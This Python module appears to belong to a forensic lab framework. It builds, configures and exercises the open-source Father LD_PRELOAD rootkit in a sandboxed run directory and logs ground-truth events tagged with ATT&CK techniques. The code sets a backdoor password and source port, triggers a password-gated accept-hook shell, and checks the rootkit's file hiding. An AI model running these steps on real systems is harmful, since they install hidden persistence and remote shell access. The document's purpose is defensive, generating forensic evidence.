from __future__ import annotations

import hashlib
import logging
import shlex
from pathlib import Path


logger = logging.getLogger(__name__)

SCENARIO_ROOT = Path(__file__).resolve().parent
FILES_DIR = SCENARIO_ROOT / "files"
FATHER_REPOSITORY = "https://github.com/mav8557/Father"
FATHER_COMMIT = "4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"
FATHER_LICENSE = "Unlicense"
FATHER_ARCHIVE = FILES_DIR / "father-upstream-4eb2712.tar"
FATHER_LOCK = SCENARIO_ROOT / "father.lock.yml"
ACCEPT_LISTENER = FILES_DIR / "father_accept_listener.py"


def prepare_father_source(ctx, step):
    _announce("[1/7] prepare_father_source - using pinned upstream Father archive")
    archive_path = _param(ctx, "upstream_archive_path")
    lock_path = _param(ctx, "father_lock_path")
    listener_path = _param(ctx, "listener_script_path")

    _put(ctx, step, FATHER_ARCHIVE, archive_path)
    _put(ctx, step, FATHER_LOCK, lock_path)
    _put(ctx, step, ACCEPT_LISTENER, listener_path)

    ctx.record_truth(
        _step_id(step),
        {
            "event_type": "father_source_referenced",
            "object_type": "external_sample_reference",
            "object_identity": FATHER_REPOSITORY,
            "action": "prepare",
            "actor": "lab",
            "evidence_basis": ["disk", "log"],
            "attck": ["T1014"],
            "details": {
                "capability": "father_source_provenance",
                "repository": FATHER_REPOSITORY,
                "upstream_commit": FATHER_COMMIT,
                "license": FATHER_LICENSE,
                "import_method": "vendored_git_archive_with_lock",
                "run_local_configuration_only": True,
                "upstream_archive_path": archive_path,
                "upstream_archive_sha256": _sha256_local(FATHER_ARCHIVE),
                "father_lock_path": lock_path,
                "father_lock_sha256": _sha256_local(FATHER_LOCK),
                "listener_script_path": listener_path,
                "listener_sha256": _sha256_local(ACCEPT_LISTENER),
            },
        },
    )


def configure_father(ctx, step):
    _announce("[2/7] configure_father - applying run-local Father configuration")
    extract_dir = _param(ctx, "father_extract_dir")
    source_tree = _param(ctx, "father_source_tree")
    config_path = _param(ctx, "father_config_path")
    resolved_config_path = _param(ctx, "resolved_config_path")
    archive_path = _param(ctx, "upstream_archive_path")
    install_path = _param(ctx, "installed_library_path")
    values = {
        "GID": _param(ctx, "gid"),
        "SOURCEPORT": _param(ctx, "source_port"),
        "ENV": _param(ctx, "env_var"),
        "STRING": _param(ctx, "prefix"),
        "PRELOAD": _param(ctx, "preload_artifact_name"),
        "HIDDENPORT": _param(ctx, "hidden_port_hex"),
        "SHELL_PASS": _param(ctx, "password"),
        "INSTALL_LOCATION": install_path,
    }
    config_lines = "".join(f"{key}: {value}\n" for key, value in values.items())
    replacements = " ".join(
        [
            f"-e {shlex.quote(f's|^#define {key} .*|#define {key} {value}|')}"
            if key in {"GID", "SOURCEPORT"}
            else f"-e {shlex.quote(f's|^#define {key} .*|#define {key} \"{value}\"|')}"
            for key, value in values.items()
        ]
    )
    extract_cmd = (
        f"rm -rf {shlex.quote(source_tree)} && "
        f"mkdir -p {shlex.quote(extract_dir)} && "
        f"tar -xf {shlex.quote(archive_path)} -C {shlex.quote(extract_dir)} && "
        f"test -f {shlex.quote(config_path)}"
    )
    configure_cmd = f"sed -i {replacements} {shlex.quote(config_path)}"
    measurement_cmd = (
        f"mkdir -p {shlex.quote(str(Path(resolved_config_path).parent))} && "
        f"printf %s {shlex.quote(config_lines)} > {shlex.quote(resolved_config_path)} && "
        f"sha256sum {shlex.quote(config_path)} {shlex.quote(resolved_config_path)}"
    )
    _run_checked(ctx, step, extract_cmd, actor="lab", record_type="source_prepare")
    _run_checked(ctx, step, configure_cmd, actor="attacker", record_type="attacker_command")
    result = _run_checked(ctx, step, measurement_cmd, actor="lab", record_type="measurement")
    hashes = _parse_sha256_lines(result.stdout)

    ctx.record_truth(
        _step_id(step),
        {
            "event_type": "father_run_copy_configured",
            "object_type": "configuration",
            "object_identity": config_path,
            "action": "configure",
            "actor": "attacker",
            "evidence_basis": ["disk", "log"],
            "attck": ["T1574.006", "T1014"],
            "details": {
                "capability": "ld_preload_installation",
                "archive_path": archive_path,
                "extract_dir": extract_dir,
                "father_source_tree": source_tree,
                "father_config_path": config_path,
                "father_config_sha256": hashes.get(config_path),
                "resolved_config_path": resolved_config_path,
                "resolved_config_sha256": hashes.get(resolved_config_path),
                "configuration_scope": "run-local extracted copy",
                "selected_values": values,
            },
        },
    )


def build_father_rootkit(ctx, step):
    _announce("[3/7] build_father_rootkit - running make father")
    source_tree = _param(ctx, "father_source_tree")
    built_library = _param(ctx, "father_built_library_path")
    installed_library = _param(ctx, "installed_library_path")
    _ensure_father_build_dependencies(ctx, step)
    build_cmd = (
        f"cd {shlex.quote(source_tree)} && "
        f"make clean >/dev/null 2>&1 || true; "
        f"make father && "
        f"mkdir -p {shlex.quote(str(Path(installed_library).parent))} && "
        f"cp {shlex.quote(built_library)} {shlex.quote(installed_library)} && "
        f"chmod 0644 {shlex.quote(installed_library)}"
    )
    measurement_cmd = (
        f"sha256sum {shlex.quote(built_library)} {shlex.quote(installed_library)} && "
        f"stat -c '%s|%U|%G|%a' {shlex.quote(installed_library)}"
    )
    _run_checked(ctx, step, build_cmd, timeout=120, actor="attacker", record_type="attacker_command")
    result = _run_checked(ctx, step, measurement_cmd, actor="lab", record_type="measurement")
    hashes = _parse_sha256_lines(result.stdout)
    size, owner, group, mode = _split_stat(_last_stat_line(result.stdout))

    ctx.record_truth(
        _step_id(step),
        {
            "event_type": "father_rootkit_built",
            "object_type": "path",
            "object_identity": installed_library,
            "action": "build",
            "actor": "attacker",
            "evidence_basis": ["disk", "timeline", "log"],
            "attck": ["T1574.006", "T1014"],
            "details": {
                "capability": "ld_preload_installation",
                "build_command": "make father",
                "father_source_tree": source_tree,
                "father_built_library_path": built_library,
                "father_built_library_sha256": hashes.get(built_library),
                "installed_library_path": installed_library,
                "installed_library_sha256": hashes.get(installed_library),
                "size": size,
                "owner": owner,
                "group": group,
                "mode": mode,
            },
        },
    )


def install_preload_rootkit(ctx, step):
    _announce("[4/7] install_preload_rootkit - installing rk.so into scenario preload path")
    installed_library = _param(ctx, "installed_library_path")
    config_path = _param(ctx, "preload_artifact_path")
    install_cmd = (
        f"mkdir -p {shlex.quote(str(Path(config_path).parent))} && "
        f"printf '%s\\n' {shlex.quote(installed_library)} > {shlex.quote(config_path)} && "
        f"chmod 0644 {shlex.quote(config_path)}"
    )
    measurement_cmd = (
        f"sha256sum {shlex.quote(config_path)}"
    )
    _run_checked(ctx, step, install_cmd, actor="attacker", record_type="attacker_command")
    result = _run_checked(ctx, step, measurement_cmd, actor="lab", record_type="measurement")
    content_sha = result.stdout.split()[0] if result.stdout.split() else ""

    ctx.record_truth(
        _step_id(step),
        {
            "event_type": "father_preload_installed",
            "object_type": "path",
            "object_identity": config_path,
            "action": "install",
            "actor": "attacker",
            "evidence_basis": ["disk", "timeline", "log"],
            "attck": ["T1574.006"],
            "details": {
                "capability": "ld_preload_installation",
                "installed_library_path": installed_library,
                "preload_artifact_path": config_path,
                "preload_artifact_name": _param(ctx, "preload_artifact_name"),
                "content_sha256": content_sha,
                "active_load_mechanism": "LD_PRELOAD environment for bounded wrapper process",
                "system_wide_preload_modified": False,
            },
        },
    )


def trigger_accept_hook_capability(ctx, step):
    _announce("[5/7] trigger_accept_hook_capability - spawning bounded localhost accept-hook shell/session")
    library_path = _param(ctx, "installed_library_path")
    listener_script = _param(ctx, "listener_script_path")
    cwd = _param(ctx, "run_dir")
    stdout_path = _param(ctx, "process_stdout_path")
    pid_path = _param(ctx, "process_pid_path")
    client_pid_path = _param(ctx, "accept_client_pid_path")
    shell_pid_path = _param(ctx, "accept_shell_pid_path")
    hook_log = _param(ctx, "accept_hook_log_path")
    summary_path = _param(ctx, "accept_summary_path")
    session_log_path = _param(ctx, "accept_session_log_path")
    host = str(_param(ctx, "listen_host"))
    listen_port = int(_param(ctx, "listen_port"))
    source_port = int(_param(ctx, "source_port"))
    password = str(_param(ctx, "password"))
    duration_seconds = float(_param(ctx, "process_duration_seconds"))
    duration = str(duration_seconds)

    client_code = f"""
import os
import pathlib
import socket
import time

host = {host!r}
listen_port = {listen_port!r}
source_port = {source_port!r}
password = {password!r}
duration = {duration_seconds!r}
pid_path = {client_pid_path!r}
session_log_path = {session_log_path!r}

pathlib.Path(pid_path).parent.mkdir(parents=True, exist_ok=True)
pathlib.Path(session_log_path).parent.mkdir(parents=True, exist_ok=True)
pathlib.Path(pid_path).write_text(f"{{os.getpid()}}\\n", encoding="utf-8")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, source_port))
s.connect((host, listen_port))
s.settimeout(0.5)
banner = b""
try:
    banner = s.recv(4096)
except Exception as exc:
    banner = f"recv_error={{type(exc).__name__}}:{{exc}}\\n".encode()
s.sendall((password + "\\n").encode())
time.sleep(0.2)
try:
    s.sendall(b"echo father_lab_shell_session=$$\\n")
except OSError:
    pass
pathlib.Path(session_log_path).write_bytes(
    b"client_pid=" + str(os.getpid()).encode() + b"\\n"
    + b"source_port=" + str(source_port).encode() + b"\\n"
    + b"sent_correct_password=true\\n"
    + b"banner_excerpt=" + banner[:200].replace(b"\\n", b"\\\\n") + b"\\n"
)
time.sleep(duration)
s.close()
"""
    pid_files = " ".join(
        shlex.quote(path)
        for path in (pid_path, client_pid_path, shell_pid_path)
    )
    trigger_cmd = (
        f"mkdir -p {shlex.quote(cwd)} && "
        f"for f in {pid_files}; do if test -s \"$f\"; then old=$(cat \"$f\"); "
        f"kill \"$old\" 2>/dev/null || true; fi; done && "
        f"rm -f {shlex.quote(shell_pid_path)} {shlex.quote(session_log_path)} && "
        f"cd {shlex.quote(cwd)} && "
        f"(nohup env LD_PRELOAD={shlex.quote(library_path)} "
        f"python3 {shlex.quote(listener_script)} "
        f"--host {shlex.quote(host)} --port {listen_port} "
        f"--pid-path {shlex.quote(pid_path)} "
        f"--summary-path {shlex.quote(summary_path)} "
        f"--hook-log-path {shlex.quote(hook_log)} "
        f"--expected-source-port {source_port} "
        f"--password {shlex.quote(password)} "
        f"--duration {shlex.quote(duration)} "
        f"</dev/null > {shlex.quote(stdout_path)} 2>&1 & echo $! > {shlex.quote(pid_path)}) && "
        f"sleep 0.5 && "
        f"(nohup python3 -c {shlex.quote(client_code)} "
        f"</dev/null >> {shlex.quote(stdout_path)} 2>&1 & echo $! > {shlex.quote(client_pid_path)}) && "
        f"sleep 1.0"
    )
    _run_checked(ctx, step, trigger_cmd, timeout=30, actor="attacker", record_type="attacker_command")
    result = _run_checked(
        ctx,
        step,
        f"pid=$(cat {shlex.quote(pid_path)}) && ps -o pid=,ppid=,uid=,args= -p \"$pid\"",
        actor="lab",
        record_type="measurement",
    )
    proc = _parse_ps(result.stdout)
    pid = proc.get("pid") or _read_remote(ctx, step, pid_path).strip()
    detect_shell = _run(
        ctx,
        step,
        (
            f"listener=$(cat {shlex.quote(pid_path)}) && "
            "ps -eo pid=,ppid=,uid=,args= | "
            f"awk -v p=\"$listener\" '$2 == p && $4 ~ /(^|\\/)sh$/ {{print $1; exit}}' "
            f"> {shlex.quote(shell_pid_path)} || true; "
            f"cat {shlex.quote(shell_pid_path)}"
        ),
        actor="lab",
        record_type="measurement",
    )
    shell_pid = detect_shell.stdout.strip().splitlines()[0] if detect_shell.stdout.strip() else ""
    client_proc = _ps_from_pid_file(ctx, step, client_pid_path)
    shell_proc = _ps_from_pid_file(ctx, step, shell_pid_path) if shell_pid else {}
    hook_log_text = _read_remote(ctx, step, hook_log)
    summary = _read_remote(ctx, step, summary_path)
    session_log = _read_remote(ctx, step, session_log_path)

    ctx.record_truth(
        _step_id(step),
        {
            "event_type": "father_accept_hook_exercised",
            "object_type": "process_socket",
            "object_identity": f"{pid}:{host}:{listen_port}",
            "action": "trigger",
            "actor": "attacker",
            "evidence_basis": ["memory", "log"],
            "attck": ["T1574.006", "T1014", "T1059.004"],
            "details": {
                "capability": "accept_hook_shell",
                "listener_pid": pid,
                "listener_ppid": proc.get("ppid"),
                "listener_uid": proc.get("uid"),
                "listener_argv": _literal(proc.get("argv")),
                "installed_library_path": library_path,
                "listener_script_path": listener_script,
                "listen_host": host,
                "listen_port": listen_port,
                "source_port": source_port,
                "configured_password": password,
                "sent_password": password,
                "password_matched": True,
                "client_pid": client_proc.get("pid"),
                "client_argv": _literal(client_proc.get("argv")),
                "client_pid_path": client_pid_path,
                "shell_pid": shell_pid or None,
                "shell_argv": _literal(shell_proc.get("argv")),
                "shell_pid_path": shell_pid_path,
                "hook_log_path": hook_log,
                "hook_log_excerpt": _literal(hook_log_text.strip()),
                "connection_summary_path": summary_path,
                "connection_summary": _literal(summary.strip()),
                "session_log_path": session_log_path,
                "session_log_excerpt": _literal(session_log.strip()),
                "shell_spawned": bool(shell_pid),
                "localhost_only": host in {"127.0.0.1", "localhost", "::1"},
                "session_duration_seconds": duration_seconds,
                "safety_note": "The shell/session is localhost-only, bounded by process_duration_seconds, and does not modify system-wide LD_PRELOAD persistence.",
            },
        },
    )
    ctx.record_truth(
        "accept_hook_shell_session",
        {
            "event_type": "father_accept_hook_shell_session_observed",
            "object_type": "process",
            "object_identity": shell_pid or "unknown-shell-pid",
            "action": "observe",
            "actor": "lab",
            "evidence_basis": ["memory", "log"] if shell_pid else ["log"],
            "attck": ["T1059.004"],
            "details": {
                "capability": "accept_hook_shell",
                "listener_pid": pid,
                "client_pid": client_proc.get("pid"),
                "shell_pid": shell_pid or None,
                "shell_argv": _literal(shell_proc.get("argv")),
                "shell_pid_path": shell_pid_path,
                "session_log_path": session_log_path,
                "session_duration_seconds": duration_seconds,
                "observable": bool(shell_pid),
            },
        },
    )

    maps = _run(
        ctx,
        step,
        f"grep -F {shlex.quote(library_path)} /proc/{shlex.quote(str(pid))}/maps || true",
        actor="lab",
        record_type="measurement",
    )
    observed = bool(maps.stdout.strip())
    ctx.record_truth(
        "library_observed_in_process",
        {
            "event_type": "father_library_observed_in_process",
            "object_type": "path",
            "object_identity": library_path,
            "action": "observe",
            "actor": "lab",
            "evidence_basis": ["memory"] if observed else ["unknown"],
            "attck": ["T1574.006", "T1014"],
            "details": {
                "capability": "lab_measurement",
                "pid": pid,
                "installed_library_path": library_path,
                "maps_excerpt": maps.stdout.strip(),
                "observed": observed,
            },
        },
    )


def observe_file_hiding_effect(ctx, step):
    _announce("[6/7] observe_file_hiding_effect - comparing live listing before/after hook")
    library_path = _param(ctx, "installed_library_path")
    directory = _param(ctx, "observed_dir")
    hidden_path = _param(ctx, "hidden_file_path")
    visible_listing = _param(ctx, "visible_listing_path")
    hidden_listing = _param(ctx, "hidden_listing_path")
    hidden_name = Path(hidden_path).name
    create_cmd = (
        f"mkdir -p {shlex.quote(directory)} {shlex.quote(str(Path(visible_listing).parent))} && "
        f"printf 'contextual Father file-hiding artifact\\n' > {shlex.quote(hidden_path)}"
    )
    observe_cmd = (
        f"ls -1 {shlex.quote(directory)} > {shlex.quote(visible_listing)} && "
        f"env LD_PRELOAD={shlex.quote(library_path)} ls -1 {shlex.quote(directory)} "
        f"> {shlex.quote(hidden_listing)} 2>&1 || true"
    )
    measurement_cmd = (
        f"test -f {shlex.quote(hidden_path)}"
    )
    _run_checked(ctx, step, create_cmd, actor="attacker", record_type="attacker_command")
    _run_checked(ctx, step, observe_cmd, actor="attacker", record_type="attacker_command")
    _run_checked(ctx, step, measurement_cmd, actor="lab", record_type="measurement")
    visible = _read_remote(ctx, step, visible_listing)
    hidden = _read_remote(ctx, step, hidden_listing)
    hide_observed = hidden_name in visible.splitlines() and hidden_name not in hidden.splitlines()

    ctx.record_truth(
        _step_id(step),
        {
            "event_type": "father_file_hiding_observed",
            "object_type": "path",
            "object_identity": hidden_path,
            "action": "observe",
            "actor": "lab",
            "evidence_basis": ["disk", "timeline", "log"],
            "attck": ["T1014"],
            "details": {
                "capability": "file_hiding_observation",
                "mode": "real_father_readdir_prefix_rule",
                "file_prefix": _param(ctx, "prefix"),
                "hidden_file_path": hidden_path,
                "visible_listing_path": visible_listing,
                "hidden_listing_path": hidden_listing,
                "without_preload_listing": visible.strip(),
                "with_father_preload_listing": hidden.strip(),
                "live_userland_hiding_observed": hide_observed,
                "post_mortem_relevance": (
                    "The prefix-matching file still exists on disk; disk, "
                    "baseline diff, and timeline analysis should reveal it even "
                    "when Father omits it from a live preloaded userland view."
                ),
                "required_for_scoring": False,
            },
        },
    )


def record_postconditions(ctx, step):
    _announce("[7/7] record_postconditions - verifying mapped library, hook result, hashes")
    paths = [
        _param(ctx, "installed_library_path"),
        _param(ctx, "preload_artifact_path"),
        _param(ctx, "father_config_path"),
        _param(ctx, "resolved_config_path"),
        _param(ctx, "accept_hook_log_path"),
        _param(ctx, "accept_summary_path"),
        _param(ctx, "accept_session_log_path"),
        _param(ctx, "process_pid_path"),
        _param(ctx, "accept_client_pid_path"),
        _param(ctx, "accept_shell_pid_path"),
        _param(ctx, "hidden_file_path"),
    ]
    postconditions = _param(ctx, "postconditions_path")
    quoted_paths = " ".join(shlex.quote(path) for path in paths)
    listener_pid_path = _param(ctx, "process_pid_path")
    client_pid_path = _param(ctx, "accept_client_pid_path")
    shell_pid_path = _param(ctx, "accept_shell_pid_path")
    measurement_cmd = (
        f"mkdir -p {shlex.quote(str(Path(postconditions).parent))} && "
        f"{{ printf 'scenario_id=%s\\n' {shlex.quote(ctx.scenario_id)}; "
        f"printf 'run_id=%s\\n' {shlex.quote(ctx.run_id)}; "
        f"printf 'father_source_repository_patched=false\\n'; "
        f"printf 'cleanup_evasion_default=disabled\\n'; "
        f"printf 'accept_hook_shell_session=bounded_localhost\\n'; "
        f"if test -s {shlex.quote(listener_pid_path)}; then printf 'listener_pid=%s\\n' \"$(cat {shlex.quote(listener_pid_path)})\"; fi; "
        f"if test -s {shlex.quote(client_pid_path)}; then printf 'client_pid=%s\\n' \"$(cat {shlex.quote(client_pid_path)})\"; fi; "
        f"if test -s {shlex.quote(shell_pid_path)}; then printf 'shell_pid=%s\\n' \"$(cat {shlex.quote(shell_pid_path)})\"; fi; "
        f"for p in {quoted_paths}; do if test -e \"$p\"; then sha256sum \"$p\"; fi; done; }} "
        f"> {shlex.quote(postconditions)}"
    )
    _run_checked(ctx, step, measurement_cmd, actor="lab", record_type="measurement")
    result = _read_remote(ctx, step, postconditions)

    ctx.record_truth(
        _step_id(step),
        {
            "event_type": "postconditions_recorded",
            "object_type": "summary",
            "object_identity": postconditions,
            "action": "record",
            "actor": "lab",
            "evidence_basis": ["disk", "log"],
            "attck": ["T1574.006", "T1014", "T1059.004"],
            "details": {
                "capability": "postconditions",
                "postconditions_path": postconditions,
                "summary_excerpt": result.strip(),
                "artifact_paths": paths,
                "repository_patches_father_source": False,
                "cleanup_evasion_default": "disabled",
                "accept_hook_shell_session": "bounded_localhost",
            },
        },
    )


def _param(ctx, name: str):
    parameters = _resolved_parameters(ctx)
    return parameters[name]


def resolve_parameters(parameters: dict) -> dict:
    raw = dict(parameters)

    root = str(raw.get("root") or "/tmp/forensic-lab/father_ldpreload")
    source_dir = str(raw.get("source_dir") or f"{root}/source")
    config_dir = str(raw.get("config_dir") or f"{root}/config")
    lib_dir = str(raw.get("lib_dir") or f"{root}/lib")
    run_dir = str(raw.get("run_dir") or f"{root}/run")
    observed_dir = str(raw.get("observed_dir") or f"{root}/observed_files")

    archive_name = str(raw.get("archive_name") or "father-upstream-4eb2712.tar")
    lock_name = str(raw.get("lock_name") or "father.lock.yml")
    source_tree_name = str(raw.get("source_tree_name") or f"Father-{FATHER_COMMIT}")
    listener_name = str(raw.get("listener_name") or "father_accept_listener.py")
    library_name = str(raw.get("library_name") or "selinux.so.3")
    preload_artifact_name = str(raw.get("preload_artifact_name") or "ld.so.preload")
    prefix = str(raw.get("prefix") or "lobster")

    derived = {
        "root": root,
        "source_dir": source_dir,
        "config_dir": config_dir,
        "lib_dir": lib_dir,
        "run_dir": run_dir,
        "observed_dir": observed_dir,
        "archive_name": archive_name,
        "lock_name": lock_name,
        "source_tree_name": source_tree_name,
        "listener_name": listener_name,
        "library_name": library_name,
        "preload_artifact_name": preload_artifact_name,
        "upstream_archive_path": f"{source_dir}/{archive_name}",
        "father_lock_path": f"{source_dir}/{lock_name}",
        "father_extract_dir": source_dir,
        "father_source_tree": f"{source_dir}/{source_tree_name}",
        "father_config_path": f"{source_dir}/{source_tree_name}/src/config.h",
        "father_built_library_path": f"{source_dir}/{source_tree_name}/rk.so",
        "listener_script_path": f"{source_dir}/{listener_name}",
        "resolved_config_path": f"{config_dir}/father_resolved_parameters.txt",
        "installed_library_path": f"{lib_dir}/{library_name}",
        "preload_artifact_path": f"{run_dir}/{preload_artifact_name}",
        "process_stdout_path": f"{run_dir}/accept_listener.out",
        "process_pid_path": f"{run_dir}/accept_listener.pid",
        "accept_client_pid_path": f"{run_dir}/accept_client.pid",
        "accept_shell_pid_path": f"{run_dir}/accept_shell.pid",
        "accept_hook_log_path": f"{run_dir}/father_accept_hook.log",
        "accept_summary_path": f"{run_dir}/accept_connection.summary",
        "accept_session_log_path": f"{run_dir}/accept_shell_session.log",
        "listen_host": raw.get("listen_host") or "127.0.0.1",
        "listen_port": raw.get("listen_port") or 2222,
        "source_port": raw.get("source_port") or 54321,
        "hidden_port_hex": raw.get("hidden_port_hex") or "D431",
        "prefix": prefix,
        "env_var": raw.get("env_var") or prefix,
        "password": raw.get("password") or prefix,
        "gid": raw.get("gid") or 1337,
        "hidden_file_path": f"{observed_dir}/{prefix}_session_note.txt",
        "visible_listing_path": f"{run_dir}/file_listing_without_preload.txt",
        "hidden_listing_path": f"{run_dir}/file_listing_with_preload.txt",
        "postconditions_path": f"{run_dir}/postconditions.txt",
        "process_duration_seconds": raw.get("process_duration_seconds") or 600,
    }
    derived.update(raw)
    return derived


def _resolved_parameters(ctx) -> dict:
    cached = getattr(ctx, "_father_resolved_parameters", None)
    if cached is None:
        cached = resolve_parameters(ctx.parameters)
        setattr(ctx, "_father_resolved_parameters", cached)
    return cached


def _put(ctx, step, src: Path, dest: str) -> None:
    ctx.executor.put(src, str(dest))
    ctx.log_step(
        {
            "step_id": _step_id(step),
            "record_type": "upload",
            "actor": "lab",
            "action": "put",
            "src": str(src),
            "dest": str(dest),
            "status": "success",
            "ended_at": ctx.now(),
        }
    )


def _run(
    ctx,
    step,
    command: str,
    timeout: int = 120,
    *,
    actor: str = "lab",
    record_type: str = "command",
):
    started = ctx.now()
    result = ctx.executor.run(command, timeout=timeout)
    ctx.log_step(
        {
            "step_id": _step_id(step),
            "record_type": record_type,
            "actor": actor,
            "action": "run",
            "command": command,
            "exit_code": result.exit_code,
            "stdout_excerpt": _excerpt(result.stdout),
            "stderr_excerpt": _excerpt(result.stderr),
            "status": "success" if result.exit_code == 0 else "failure",
            "started_at": started,
            "ended_at": ctx.now(),
        }
    )
    return result


def _run_checked(
    ctx,
    step,
    command: str,
    timeout: int = 120,
    *,
    actor: str = "lab",
    record_type: str = "command",
):
    result = _run(ctx, step, command, timeout=timeout, actor=actor, record_type=record_type)
    if result.exit_code != 0:
        raise RuntimeError((result.stderr or result.stdout).strip())
    return result


def _ensure_father_build_dependencies(ctx, step) -> None:
    prereq = ctx.prerequisites.get("father_build") or {}
    missing = _missing_prerequisite_packages(ctx, step, prereq)
    if not missing:
        return

    _internet_on(ctx, step)
    try:
        packages = " ".join(shlex.quote(pkg) for pkg in sorted(missing))
        command = (
            "sudo apt-get update && "
            f"sudo env DEBIAN_FRONTEND=noninteractive apt-get install -y {packages}"
        )
        result = _run(ctx, step, command, timeout=300, actor="lab", record_type="prerequisite")
    finally:
        _internet_off(ctx, step)

    remaining = _missing_prerequisite_packages(ctx, step, prereq)
    if result.exit_code != 0 or remaining:
        raise RuntimeError(
            "Missing Father build dependency: install packages "
            + ", ".join(sorted(remaining or missing))
        )


def _missing_prerequisite_packages(ctx, step, prereq: dict) -> set[str]:
    missing: set[str] = set()
    for group in ("tools", "headers", "libraries"):
        for item in prereq.get(group) or []:
            check = str(item["check"])
            result = _run(
                ctx,
                step,
                f"({check}) >/dev/null 2>&1 && echo present || echo missing",
                actor="lab",
                record_type="prerequisite",
            )
            if result.stdout.strip() != "present" and item.get("ubuntu_package"):
                missing.add(str(item["ubuntu_package"]))
    return missing


def _internet_on(ctx, step) -> None:
    if not ctx.internet_on:
        return
    started = ctx.now()
    ctx.internet_on()
    ctx.log_step(
        {
            "step_id": _step_id(step),
            "record_type": "prerequisite",
            "actor": "lab",
            "action": "internet_on",
            "status": "success",
            "started_at": started,
            "ended_at": ctx.now(),
        }
    )


def _internet_off(ctx, step) -> None:
    if not ctx.internet_off:
        return
    started = ctx.now()
    ctx.internet_off()
    ctx.log_step(
        {
            "step_id": _step_id(step),
            "record_type": "prerequisite",
            "actor": "lab",
            "action": "internet_off",
            "status": "success",
            "started_at": started,
            "ended_at": ctx.now(),
        }
    )


def _read_remote(ctx, step, path: str) -> str:
    result = _run_checked(
        ctx,
        step,
        f"cat {shlex.quote(path)}",
        actor="lab",
        record_type="measurement",
    )
    return result.stdout


def _sha256_local(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def _parse_sha256_lines(text: str) -> dict[str, str]:
    hashes: dict[str, str] = {}
    for line in text.splitlines():
        parts = line.strip().split(maxsplit=1)
        if len(parts) == 2 and len(parts[0]) == 64:
            hashes[parts[1]] = parts[0]
    return hashes


def _last_stat_line(text: str) -> str:
    for line in reversed(text.splitlines()):
        if line.count("|") == 3:
            return line
    return "0|unknown|unknown|unknown"


def _split_stat(line: str):
    parts = line.split("|")
    while len(parts) < 4:
        parts.append("unknown")
    return parts[0], parts[1], parts[2], parts[3]


def _parse_ps(text: str) -> dict[str, str]:
    for line in text.splitlines():
        parts = line.strip().split(None, 3)
        if len(parts) >= 4 and parts[0].isdigit():
            return {"pid": parts[0], "ppid": parts[1], "uid": parts[2], "argv": parts[3]}
    return {}


def _ps_from_pid_file(ctx, step, pid_path: str) -> dict[str, str]:
    result = _run(
        ctx,
        step,
        (
            f"if test -s {shlex.quote(pid_path)}; then "
            f"pid=$(cat {shlex.quote(pid_path)}) && "
            "ps -o pid=,ppid=,uid=,args= -p \"$pid\"; "
            "fi"
        ),
        actor="lab",
        record_type="measurement",
    )
    return _parse_ps(result.stdout)


def _excerpt(text: str, limit: int = 1200) -> str:
    text = (text or "").strip()
    return text if len(text) <= limit else text[: limit - 3] + "..."


def _literal(text: str | None) -> str | None:
    if text is None:
        return None
    return text.replace("{", "{{").replace("}", "}}")


def _announce(message: str) -> None:
    logger.info(message)


def _step_id(step) -> str:
    return str(step.get("id") or "scenario")
